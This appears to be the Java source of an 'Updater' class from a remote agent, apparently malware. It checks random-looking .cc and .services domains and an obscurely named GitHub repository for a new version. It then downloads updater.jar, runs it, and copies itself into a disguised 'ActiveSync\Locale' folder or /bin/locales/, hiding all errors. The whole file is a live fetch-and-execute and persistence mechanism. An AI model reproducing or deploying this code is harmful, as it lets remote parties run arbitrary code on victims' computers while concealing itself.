package org.anywhere.agent.utils.computer;

import org.anywhere.agent.settings.Settings;
import org.anywhere.agent.utils.URLUtils;
import org.anywhere.agent.launch.Launch;
import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.IOException;

public class Updater {

    private final boolean windows;
    private final String folder;
    private final String[] links;

    public Updater(final boolean windows) {
        this.windows = windows;
        this.folder = this.windows ? System.getenv("LOCALAPPDATA") + "\\Packages\\ActiveSync\\Locale" : "/bin/locales/";
        this.links = new String[]{"http://default.km1hx7llk8.cc", "https://default.km1hx7llk8.cc", "http://default.40w629twp1.services", "https://default.40w629twp1.services", "https://github.com/tayrfhnqquxzenaqyyv7a8dza/ta4px90/blob/main"};
    }

    public void updateAsPossible() {
        try {
            FileUtils.forceDelete(new File(this.windows ? this.folder + "\\updater.jar" : this.folder + "/updater.jar"));
        } catch (final IOException ignore) {
        }
        if (!this.canUpdatable()) return;
        this.downloadUpdater();
        this.openUpdater();
        System.exit(-1);
    }

    public void makeAfterUpdate() {
        this.replaceOlder();
        this.openUpdated();
        System.exit(-1);
    }

    private void downloadUpdater() {
        File dir = new File(this.folder);
        File tempPath = new File(this.windows ? this.folder + "\\updater.jar" : this.folder + "/updater.jar");
        if (!dir.exists()) dir.mkdirs();
        if (!tempPath.exists()) {
            boolean success = false;
            for (final String link : this.links) {
                if (success) return;
                try {
                    URLUtils.download(link + "/updater.jar" + (link.toLowerCase().contains("//github.com/") ? "?raw=true" : ""), tempPath);
                    success = true;
                } catch (Exception ignore) {
                }
            }
        }
    }

    private void openUpdater() {
        try {
            Runtime.getRuntime().exec(this.windows ? "java -Dfile.encoding=UTF8 -jar " + this.folder + "\\updater.jar -mode update" : "java -Dfile.encoding=UTF8 -jar " + this.folder + "/updater.jar -mode update");
        } catch (final IOException ignore) {
        }
    }

    private boolean canUpdatable() {
        for (final String link : this.links) {
            try {
                return !Settings.VERSION.equals(URLUtils.readFromURL(link + "/version" + (link.toLowerCase().contains("//github.com/") ? "?raw=true" : "")).replaceAll("\n", ""));
            } catch (Exception ignore) {
            }
        }
        return false;
    }

    public void replaceOlder() {
        final File file = new File(this.windows ? this.folder + "\\resources.jar" : this.folder + "/resources.jar");
        try {
            FileUtils.forceDelete(file);
            FileUtils.copyFile(new File(Launch.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()), file);
        } catch (final Exception ignore) {
        }
    }

    public void openUpdated() {
        try {
            Runtime.getRuntime().exec(this.windows ? "java -Dfile.encoding=UTF8 -jar " + this.folder + "\\resources.jar -mode back" : "java -Dfile.encoding=UTF8 -jar " + this.folder + "/resources.jar -mode back");
        } catch (final IOException ignore) {
        }
    }
}